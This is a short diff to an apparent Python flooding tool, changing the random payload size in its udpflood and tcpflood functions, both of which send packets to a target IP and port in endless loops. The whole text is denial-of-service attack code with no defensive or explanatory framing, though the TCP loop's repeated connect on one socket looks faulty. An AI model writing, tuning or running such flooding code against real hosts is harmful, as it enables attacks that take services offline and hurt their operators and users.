@@ -5,14 +5,14 @@ import threading
 
 def udpflood(ip, port):
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-  raw = os.urandom(1500)
+  raw = os.urandom(1200)
   payload = b'\xfe' + raw
   while True:
     s.sendto(payload, (ip, port))
 
 def tcpflood(ip, port):
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  raw = os.urandom(1500)
+  raw = os.urandom(1200)
   while True:
     s.connect((ip, port))
     s.send(raw)
